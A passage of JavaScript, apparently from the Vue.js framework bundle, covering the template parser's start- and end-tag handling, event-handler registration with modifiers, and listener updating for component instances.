                match.attrs.push(attr);
            }
            if (end) {
                match.unarySlash = end[1];
                advance(end[0].length);
                match.end = index;
                return match
            }
        }
    }

    function handleStartTag(match) {
        var tagName = match.tagName;
        var unarySlash = match.unarySlash;

        if (expectHTML) {
            if (lastTag === 'p' && isNonPhrasingTag(tagName)) {
                parseEndTag(lastTag);
            }
            if (canBeLeftOpenTag$$1(tagName) && lastTag === tagName) {
                parseEndTag(tagName);
            }
        }

        var unary = isUnaryTag$$1(tagName) || !!unarySlash;

        var l = match.attrs.length;
        var attrs = new Array(l);
        for (var i = 0; i < l; i++) {
            var args = match.attrs[i];
            var value = args[3] || args[4] || args[5] || '';
            var shouldDecodeNewlines = tagName === 'a' && args[1] === 'href' ?
                options.shouldDecodeNewlinesForHref :
                options.shouldDecodeNewlines;
            attrs[i] = {
                name: args[1],
                value: decodeAttr(value, shouldDecodeNewlines)
            };
            if (options.outputSourceRange) {
                attrs[i].start = args.start + args[0].match(/^\s*/).length;
                attrs[i].end = args.end;
            }
        }

        if (!unary) {
            stack.push({
                tag: tagName,
                lowerCasedTag: tagName.toLowerCase(),
                attrs: attrs,
                start: match.start,
                end: match.end
            });
            lastTag = tagName;
        }

        if (options.start) {
            options.start(tagName, attrs, unary, match.start, match.end);
        }
    }

    function parseEndTag(tagName, start, end) {
        var pos, lowerCasedTagName;
        if (start == null) {
            start = index;
        }
        if (end == null) {
            end = index;
        }

        // Find the closest opened tag of the same type
        if (tagName) {
            lowerCasedTagName = tagName.toLowerCase();
            for (pos = stack.length - 1; pos >= 0; pos--) {
                if (stack[pos].lowerCasedTag === lowerCasedTagName) {
                    break
                }
            }
        } else {
            // If no tag name is provided, clean shop
            pos = 0;
        }

        if (pos >= 0) {
            // Close all the open elements, up the stack
            for (var i = stack.length - 1; i >= pos; i--) {
                if (i > pos || !tagName &&
                    options.warn
                ) {
                    options.warn(
                        ("tag <" + (stack[i].tag) + "> has no matching end tag."), {
                            start: stack[i].start,
                            end: stack[i].end
                        }
                    );
                }
                if (options.end) {
                    options.end(stack[i].tag, start, end);
                }
            }

            // Remove the open elements from the stack
            stack.length = pos;
            lastTag = pos && stack[pos - 1].tag;
        } else if (lowerCasedTagName === 'br') {
            if (options.start) {
                options.start(tagName, [], true, start, end);
            }
        } else if (lowerCasedTagName === 'p') {
            if (options.start) {
                options.start(tagName, [], false, start, end);
            }
            if (options.end) {
                options.end(tagName, start, end);
            }
        }
    }
}

function addHandler(
    el,
    name,
    value,
    modifiers,
    important,
    warn,
    range,
    dynamic
) {
    modifiers = modifiers || emptyObject;
    // warn prevent and passive modifier
    /* istanbul ignore if */
    if (
        warn &&
        modifiers.prevent && modifiers.passive
    ) {
        warn(
            'passive and prevent can\'t be used together. ' +
            'Passive handler can\'t prevent default event.',
            range
        );
    }

    // normalize click.right and click.middle since they don't actually fire
    // this is technically browser-specific, but at least for now browsers are
    // the only target envs that have right/middle clicks.
    if (modifiers.right) {
        if (dynamic) {
            name = "(" + name + ")==='click'?'contextmenu':(" + name + ")";
        } else if (name === 'click') {
            name = 'contextmenu';
            delete modifiers.right;
        }
    } else if (modifiers.middle) {
        if (dynamic) {
            name = "(" + name + ")==='click'?'mouseup':(" + name + ")";
        } else if (name === 'click') {
            name = 'mouseup';
        }
    }

    // check capture modifier
    if (modifiers.capture) {
        delete modifiers.capture;
        name = prependModifierMarker('!', name, dynamic);
    }
    if (modifiers.once) {
        delete modifiers.once;
        name = prependModifierMarker('~', name, dynamic);
    }
    /* istanbul ignore if */
    if (modifiers.passive) {
        delete modifiers.passive;
        name = prependModifierMarker('&', name, dynamic);
    }

    var events;
    if (modifiers.native) {
        delete modifiers.native;
        events = el.nativeEvents || (el.nativeEvents = {});
    } else {
        events = el.events || (el.events = {});
    }

    var newHandler = rangeSetItem({
        value: value.trim(),
        dynamic: dynamic
    }, range);
    if (modifiers !== emptyObject) {
        newHandler.modifiers = modifiers;
    }

    var handlers = events[name];
    /* istanbul ignore if */
    if (Array.isArray(handlers)) {
        important ? handlers.unshift(newHandler) : handlers.push(newHandler);
    } else if (handlers) {
        events[name] = important ? [newHandler, handlers] : [handlers, newHandler];
    } else {
        events[name] = newHandler;
    }

    el.plain = false;
}

function createOnceHandler(event, fn) {
    var _target = target;
    return function onceHandler() {
        var res = fn.apply(null, arguments);
        if (res !== null) {
            _target.$off(event, onceHandler);
        }
    }
}

function normalizeDirectives$1(
    dirs,
    vm
) {
    var res = Object.create(null);
    if (!dirs) {
        // $flow-disable-line
        return res
    }
    var i, dir;
    for (i = 0; i < dirs.length; i++) {
        dir = dirs[i];
        if (!dir.modifiers) {
            // $flow-disable-line
            dir.modifiers = emptyModifiers;
        }
        res[getRawDirName(dir)] = dir;
        dir.def = resolveAsset(vm.$options, 'directives', dir.name, true);
    }
    // $flow-disable-line
    return res
}

function setActiveInstance(vm) {
    var prevActiveInstance = activeInstance;
    activeInstance = vm;
    return function() {
        activeInstance = prevActiveInstance;
    }
}

function updateListeners(
    on,
    oldOn,
    add,
    remove$$1,
    createOnceHandler,
    vm
) {
    var name, def$$1, cur, old, event;
    for (name in on) {
        def$$1 = cur = on[name];
        old = oldOn[name];
        event = normalizeEvent(name);
        if (isUndef(cur)) {
            warn(
                "Invalid handler for event \"" + (event.name) + "\": got " + String(cur),
                vm
            );
        } else if (isUndef(old)) {
            if (isUndef(cur.fns)) {
                cur = on[name] = createFnInvoker(cur, vm);
            }
            if (isTrue(event.once)) {
                cur = on[name] = createOnceHandler(event.name, cur, event.capture);
            }
            add(event.name, cur, event.capture, event.passive, event.params);
        } else if (cur !== old) {
            old.fns = cur;
            on[name] = old;
        }
    }
    for (name in oldOn) {
        if (isUndef(on[name])) {
            event = normalizeEvent(name);
            remove$$1(event.name, oldOn[name], event.capture);
        }
    }
}